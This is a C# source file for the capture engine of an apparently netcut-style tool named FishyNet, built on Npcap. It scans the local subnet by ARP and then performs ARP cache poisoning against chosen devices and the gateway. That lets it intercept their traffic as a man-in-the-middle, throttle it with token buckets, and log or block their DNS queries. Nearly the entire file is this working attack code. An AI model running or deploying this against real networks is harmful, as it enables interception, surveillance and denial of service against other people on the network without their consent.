using System.Diagnostics;
using System.Net.NetworkInformation;
using FishyNet.Core.Native;
using FishyNet.Core.Packets;

namespace FishyNet.Core;

public sealed record NetworkAdapterInfo(
    string Id,
    string Name,
    string Description,
    NetworkInterfaceType InterfaceType,
    Ipv4Address LocalIp,
    Ipv4Address SubnetMask,
    Ipv4Address GatewayIp,
    MacAddress LocalMac,
    bool IsIpv4ForwardingEnabled);

/// <summary>
/// High-performance, zero-allocation packet capture, ARP spoofing, and Token-Bucket traffic redirection engine.
/// Directly wraps native wpcap.dll (Npcap) handles using Span&lt;byte&gt; over kernel ring buffers.
/// </summary>
public sealed class CaptureEngine : IDisposable
{
    private readonly DeviceRegistry _registry;
    private NetworkAdapterInfo? _adapter;

    private nint _arpHandle;
    private nint _redirectHandle;
    private readonly object _handleLock = new();

    private CancellationTokenSource? _arpListenerCts;
    private CancellationTokenSource? _redirectorCts;
    private CancellationTokenSource? _scanCts;

    private Task? _arpListenerTask;
    private Task? _redirectorTask;
    private Task? _spoofLoopTask;

    private volatile bool _isRedirecting;
    private volatile bool _isScanning;
    private bool _disposed;

    public DeviceRegistry Registry => _registry;
    public NetworkAdapterInfo? ActiveAdapter => _adapter;
    public bool IsRedirecting => _isRedirecting;
    public bool IsScanning => _isScanning;

    public event Action<string>? StatusLog;

    public CaptureEngine(DeviceRegistry registry)
    {
        _registry = registry;
    }

    public static IReadOnlyList<NetworkAdapterInfo> DiscoverSuitableAdapters()
    {
        var list = new List<NetworkAdapterInfo>();
        try
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus != OperationalStatus.Up ||
                    nic.NetworkInterfaceType == NetworkInterfaceType.Loopback ||
                    nic.NetworkInterfaceType == NetworkInterfaceType.Tunnel)
                {
                    continue;
                }

                IPInterfaceProperties ipProps = nic.GetIPProperties();
                Ipv4Address localIp = Ipv4Address.Zero;
                Ipv4Address mask = Ipv4Address.Zero;

                foreach (UnicastIPAddressInformation unicast in ipProps.UnicastAddresses)
                {
                    if (unicast.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        localIp = Ipv4Address.FromIPAddress(unicast.Address);
                        if (unicast.IPv4Mask != null)
                        {
                            mask = Ipv4Address.FromIPAddress(unicast.IPv4Mask);
                        }
                        break;
                    }
                }

                if (localIp.IsZero)
                {
                    continue;
                }

                Ipv4Address gatewayIp = Ipv4Address.Zero;
                foreach (GatewayIPAddressInformation gw in ipProps.GatewayAddresses)
                {
                    if (gw.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        var candidate = Ipv4Address.FromIPAddress(gw.Address);
                        if (!candidate.IsZero)
                        {
                            gatewayIp = candidate;
                            break;
                        }
                    }
                }

                if (gatewayIp.IsZero)
                {
                    continue;
                }

                MacAddress localMac = MacAddress.FromPhysicalAddress(nic.GetPhysicalAddress());
                if (localMac.IsZero)
                {
                    continue;
                }

                bool forwarding = false;
                try
                {
                    forwarding = ipProps.GetIPv4Properties()?.IsForwardingEnabled ?? false;
                }
                catch
                {
                    // Ignore if unsupported on virtual interface
                }

                list.Add(new NetworkAdapterInfo(
                    nic.Id,
                    nic.Name,
                    nic.Description,
                    nic.NetworkInterfaceType,
                    localIp,
                    mask.IsZero ? new Ipv4Address(0xFFFFFF00u) : mask,
                    gatewayIp,
                    localMac,
                    forwarding));
            }
        }
        catch (Exception ex)
        {
            Debug.WriteLine($"Error enumerating NICs: {ex.Message}");
        }

        return list;
    }

    public bool BindAdapter(NetworkAdapterInfo adapter, out string? error)
    {
        StopAll();

        _adapter = adapter;
        _registry.Clear();
        _registry.ConfigureLocalNetwork(adapter.LocalIp, adapter.LocalMac, adapter.GatewayIp);

        lock (_handleLock)
        {
            _arpHandle = WpcapNative.OpenLiveDevice(adapter.Id, 65535, 1, 5, out error);
            if (_arpHandle == nint.Zero)
            {
                return false;
            }

            WpcapNative.SetBpfFilter(_arpHandle, "arp");
        }

        _arpListenerCts = new CancellationTokenSource();
        _arpListenerTask = Task.Factory.StartNew(
            () => RunArpListenerLoop(_arpListenerCts.Token),
            _arpListenerCts.Token,
            TaskCreationOptions.LongRunning,
            TaskScheduler.Default);

        // Immediately probe the router MAC
        SendArpWhoHas(adapter.GatewayIp);
        StatusLog?.Invoke($"Bound to {adapter.Description} ({adapter.LocalIp}, GW {adapter.GatewayIp})");
        return true;
    }

    public void SendArpWhoHas(Ipv4Address targetIp)
    {
        if (_adapter is null || targetIp.IsZero) return;

        Span<byte> frame = stackalloc byte[PacketPrimitives.ArpFrameLength];
        PacketPrimitives.WriteArpPacket(
            frame,
            MacAddress.Broadcast,
            _adapter.LocalMac,
            PacketPrimitives.ArpOpRequest,
            _adapter.LocalMac,
            _adapter.LocalIp,
            MacAddress.Broadcast,
            targetIp);

        lock (_handleLock)
        {
            if (_arpHandle != nint.Zero)
            {
                WpcapNative.SendPacket(_arpHandle, frame);
            }
        }
    }

    public async Task StartSubnetScanAsync()
    {
        if (_adapter is null || _isScanning) return;

        _isScanning = true;
        _scanCts?.Cancel();
        _scanCts = new CancellationTokenSource();
        CancellationToken ct = _scanCts.Token;

        StatusLog?.Invoke($"Scanning subnet {_adapter.LocalIp} / {_adapter.SubnetMask}...");

        try
        {
            await Task.Run(async () =>
            {
                SendArpWhoHas(_adapter.GatewayIp);

                int count = 0;
                foreach (Ipv4Address hostIp in Ipv4Address.EnumerateSubnetHosts(_adapter.LocalIp, _adapter.SubnetMask))
                {
                    if (ct.IsCancellationRequested) break;
                    SendArpWhoHas(hostIp);
                    count++;
                    if (count % 8 == 0)
                    {
                        await Task.Delay(4, ct).ConfigureAwait(false);
                    }
                }
            }, ct).ConfigureAwait(false);

            StatusLog?.Invoke($"Subnet scan completed ({_registry.Count} active hosts).");
        }
        catch (OperationCanceledException)
        {
            // Cancelled
        }
        finally
        {
            _isScanning = false;
        }
    }

    public bool StartRedirection(out string? error)
    {
        error = null;
        if (_adapter is null)
        {
            error = "No network adapter selected.";
            return false;
        }

        if (_isRedirecting)
        {
            return true;
        }

        NetworkDevice? gw = _registry.GetGatewayDevice();
        if (gw is null || gw.Mac.IsZero)
        {
            SendArpWhoHas(_adapter.GatewayIp);
        }

        lock (_handleLock)
        {
            if (_redirectHandle == nint.Zero)
            {
                _redirectHandle = WpcapNative.OpenLiveDevice(_adapter.Id, 65535, 1, 1, out error);
                if (_redirectHandle == nint.Zero)
                {
                    return false;
                }

                if (!WpcapNative.SetBpfFilter(_redirectHandle, "ip"))
                {
                    error = "Failed to compile BPF 'ip' filter on adapter.";
                    WpcapNative.pcap_close(_redirectHandle);
                    _redirectHandle = nint.Zero;
                    return false;
                }
            }
        }

        _isRedirecting = true;
        _redirectorCts = new CancellationTokenSource();
        CancellationToken token = _redirectorCts.Token;

        _redirectorTask = Task.Factory.StartNew(
            () => RunPacketRedirectorLoop(token),
            token,
            TaskCreationOptions.LongRunning,
            TaskScheduler.Default);

        _spoofLoopTask = Task.Run(() => RunPeriodicSpoofLoopAsync(token), token);

        StatusLog?.Invoke("Active packet redirection & Token-Bucket shaping started.");
        return true;
    }

    public void StopRedirection()
    {
        if (!_isRedirecting) return;

        _isRedirecting = false;
        try
        {
            _redirectorCts?.Cancel();
            _redirectorTask?.Wait(TimeSpan.FromMilliseconds(500));
        }
        catch
        {
            // Ignore cancellation exceptions
        }

        CompleteUnspoof();

        lock (_handleLock)
        {
            if (_redirectHandle != nint.Zero)
            {
                WpcapNative.pcap_close(_redirectHandle);
                _redirectHandle = nint.Zero;
            }
        }

        StatusLog?.Invoke("Packet redirection stopped and ARP tables restored.");
    }

    public void SpoofDevice(NetworkDevice targetDevice)
    {
        if (!_isRedirecting || _adapter is null || targetDevice.IsLocalHost || targetDevice.IsGateway) return;
        NetworkDevice? gatewayDevice = _registry.GetGatewayDevice();
        if (gatewayDevice is null || gatewayDevice.Mac.IsZero) return;
        SpoofDevicePair(targetDevice, gatewayDevice);
    }

    public void SpoofDevicePair(NetworkDevice targetDevice, NetworkDevice gatewayDevice)
    {
        if (_adapter is null || targetDevice.IsLocalHost || targetDevice.IsGateway) return;

        MacAddress localMac = _adapter.LocalMac;
        Ipv4Address localIp = _adapter.LocalIp;
        Span<byte> frame = stackalloc byte[PacketPrimitives.ArpFrameLength];

        lock (_handleLock)
        {
            if (_arpHandle == nint.Zero) return;

            // 1. Tell target device that Gateway IP is at our LocalMac
            PacketPrimitives.WriteArpPacket(
                frame,
                targetDevice.Mac,
                localMac,
                PacketPrimitives.ArpOpReply,
                localMac,
                gatewayDevice.Ip,
                targetDevice.Mac,
                targetDevice.Ip);
            WpcapNative.SendPacket(_arpHandle, frame);

            // 2. Tell Gateway that Target IP is at our LocalMac
            PacketPrimitives.WriteArpPacket(
                frame,
                gatewayDevice.Mac,
                localMac,
                PacketPrimitives.ArpOpReply,
                localMac,
                targetDevice.Ip,
                gatewayDevice.Mac,
                gatewayDevice.Ip);
            WpcapNative.SendPacket(_arpHandle, frame);

            // 3. Keep our own local ARP cache clean
            PacketPrimitives.WriteArpPacket(
                frame,
                localMac,
                gatewayDevice.Mac,
                PacketPrimitives.ArpOpReply,
                gatewayDevice.Mac,
                gatewayDevice.Ip,
                localMac,
                localIp);
            WpcapNative.SendPacket(_arpHandle, frame);
        }
    }

    public void UnspoofDevice(NetworkDevice targetDevice, int burstCount = 5)
    {
        if (_adapter is null || targetDevice.IsLocalHost || targetDevice.IsGateway) return;
        NetworkDevice? gatewayDevice = _registry.GetGatewayDevice();
        if (gatewayDevice is null || gatewayDevice.Mac.IsZero) return;

        Span<byte> frame = stackalloc byte[PacketPrimitives.ArpFrameLength];

        lock (_handleLock)
        {
            if (_arpHandle == nint.Zero) return;

            for (int i = 0; i < burstCount; i++)
            {
                // Restore real Gateway MAC on target device
                PacketPrimitives.WriteArpPacket(
                    frame,
                    targetDevice.Mac,
                    gatewayDevice.Mac,
                    PacketPrimitives.ArpOpReply,
                    gatewayDevice.Mac,
                    gatewayDevice.Ip,
                    targetDevice.Mac,
                    targetDevice.Ip);
                WpcapNative.SendPacket(_arpHandle, frame);

                // Restore real Target MAC on Gateway
                PacketPrimitives.WriteArpPacket(
                    frame,
                    gatewayDevice.Mac,
                    targetDevice.Mac,
                    PacketPrimitives.ArpOpReply,
                    targetDevice.Mac,
                    targetDevice.Ip,
                    gatewayDevice.Mac,
                    gatewayDevice.Ip);
                WpcapNative.SendPacket(_arpHandle, frame);
            }
        }
    }

    public void CompleteUnspoof()
    {
        NetworkDevice? gw = _registry.GetGatewayDevice();
        if (gw is null) return;

        foreach (NetworkDevice device in _registry.AllDevices)
        {
            if (!device.IsGateway && !device.IsLocalHost)
            {
                UnspoofDevice(device, burstCount: 3);
            }
        }
    }

    private unsafe void RunArpListenerLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            nint handle = _arpHandle;
            if (handle == nint.Zero) break;

            int res = WpcapNative.pcap_next_ex(handle, out WpcapNative.PcapPkthdr* hdr, out byte* data);
            if (res <= 0 || hdr == null || data == null)
            {
                continue;
            }

            int capLen = (int)hdr->CapLen;
            if (capLen < PacketPrimitives.ArpFrameLength)
            {
                continue;
            }

            var frame = new ReadOnlySpan<byte>(data, capLen);
            if (!PacketPrimitives.TryParseArp(
                frame,
                out MacAddress ethSrcMac,
                out ushort op,
                out MacAddress senderMac,
                out Ipv4Address senderIp,
                out _,
                out _))
            {
                continue;
            }

            if (_adapter is not null && (ethSrcMac == _adapter.LocalMac || senderMac == _adapter.LocalMac))
            {
                continue;
            }

            if ((op == PacketPrimitives.ArpOpReply || op == PacketPrimitives.ArpOpRequest) &&
                !senderIp.IsZero &&
                !senderMac.IsZero &&
                !senderMac.IsBroadcast)
            {
                _registry.RegisterOrUpdateDevice(senderIp, senderMac);
            }
        }
    }

    private unsafe void RunPacketRedirectorLoop(CancellationToken ct)
    {
        if (_adapter is null) return;

        MacAddress localMac = _adapter.LocalMac;
        Ipv4Address localIp = _adapter.LocalIp;

        while (!ct.IsCancellationRequested && _isRedirecting)
        {
            nint handle = _redirectHandle;
            if (handle == nint.Zero) break;

            int res = WpcapNative.pcap_next_ex(handle, out WpcapNative.PcapPkthdr* hdr, out byte* data);
            if (res <= 0 || hdr == null || data == null)
            {
                continue;
            }

            int capLen = (int)hdr->CapLen;
            if (capLen < 34)
            {
                continue;
            }

            var frame = new Span<byte>(data, capLen);
            if (!PacketPrimitives.TryInspectIpv4Packet(
                frame,
                out _,
                out MacAddress ethSrc,
                out Ipv4Address ipSrc,
                out Ipv4Address ipDest,
                out ProtocolKind protocol,
                out ushort srcPort,
                out ushort dstPort,
                out int l4PayloadOffset))
            {
                continue;
            }

            // 1. Traffic originating from our own LocalPC
            if (ethSrc == localMac)
            {
                if (ipSrc == localIp)
                {
                    _registry.GetLocalDevice()?.RecordSentPacket(capLen, protocol);
                }
                continue;
            }

            MacAddress routerMac = _registry.GatewayMac;
            long nowTimestamp = Stopwatch.GetTimestamp();

            // 2. Inbound traffic from Gateway -> LAN Device (Download)
            if (!routerMac.IsZero && ethSrc == routerMac)
            {
                if (ipDest == localIp)
                {
                    _registry.GetLocalDevice()?.RecordReceivedPacket(capLen, protocol);
                    continue;
                }

                NetworkDevice? targetDevice = _registry.TryGetByIp(ipDest);
                if (targetDevice is not null && !targetDevice.IsLocalHost && !targetDevice.IsGateway)
                {
                    targetDevice.TouchLastSeen();
                    if (!targetDevice.IsSpoofed)
                    {
                        continue;
                    }

                    if (targetDevice.TryAllowDownloadPacket(capLen, nowTimestamp))
                    {
                        PacketPrimitives.RewriteEthernetHeaderInPlace(frame, targetDevice.Mac, localMac);
                        WpcapNative.pcap_sendpacket(handle, data, capLen);
                        targetDevice.RecordReceivedPacket(capLen, protocol);
                    }
                }
                continue;
            }

            // 3. Outbound traffic from Spoofed LAN Device -> Gateway (Upload)
            if (ipDest == localIp)
            {
                continue;
            }

            NetworkDevice? sourceDevice = _registry.TryGetByMac(ethSrc) ?? _registry.TryGetByIp(ipSrc);
            if (sourceDevice is not null && !sourceDevice.IsLocalHost && !sourceDevice.IsGateway)
            {
                sourceDevice.TouchLastSeen();

                // Inspect outbound DNS queries (UDP port 53 / 5353)
                if (protocol == ProtocolKind.Dns && (dstPort == 53 || dstPort == 5353))
                {
                    sourceDevice.RecordDnsQuery();
                    if (PacketPrimitives.TryExtractDnsQueryDomain(frame, l4PayloadOffset, out string domain))
                    {
                        bool domainBlocked = sourceDevice.IsBlocked || sourceDevice.IsDomainBlocked(domain);
                        _registry.PublishDnsQuery(sourceDevice, domain, domainBlocked);
                        if (domainBlocked)
                        {
                            sourceDevice.RecordDroppedPacket();
                            continue;
                        }
                    }
                }

                if (!sourceDevice.IsSpoofed || routerMac.IsZero)
                {
                    continue;
                }

                if (sourceDevice.TryAllowUploadPacket(capLen, nowTimestamp))
                {
                    PacketPrimitives.RewriteEthernetHeaderInPlace(frame, routerMac, localMac);
                    WpcapNative.pcap_sendpacket(handle, data, capLen);
                    sourceDevice.RecordSentPacket(capLen, protocol);
                }
            }
        }
    }

    private async Task RunPeriodicSpoofLoopAsync(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested && _isRedirecting)
        {
            try
            {
                NetworkDevice? gw = _registry.GetGatewayDevice();
                if (gw is null && _adapter is not null)
                {
                    SendArpWhoHas(_adapter.GatewayIp);
                }
                else if (gw is not null)
                {
                    foreach (NetworkDevice device in _registry.AllDevices)
                    {
                        if (ct.IsCancellationRequested) break;
                        if (device.IsSpoofed && !device.IsGateway && !device.IsLocalHost)
                        {
                            SpoofDevicePair(device, gw);
                        }
                    }
                }

                await Task.Delay(2500, ct).ConfigureAwait(false);
            }
            catch (OperationCanceledException)
            {
                break;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Spoof loop warning: {ex.Message}");
            }
        }
    }

    public void StopAll()
    {
        StopRedirection();

        try
        {
            _scanCts?.Cancel();
            _arpListenerCts?.Cancel();
            _arpListenerTask?.Wait(TimeSpan.FromMilliseconds(300));
        }
        catch
        {
            // Ignore
        }

        lock (_handleLock)
        {
            if (_arpHandle != nint.Zero)
            {
                WpcapNative.pcap_close(_arpHandle);
                _arpHandle = nint.Zero;
            }
        }
    }

    public void Dispose()
    {
        if (_disposed) return;
        _disposed = true;
        StopAll();
    }
}
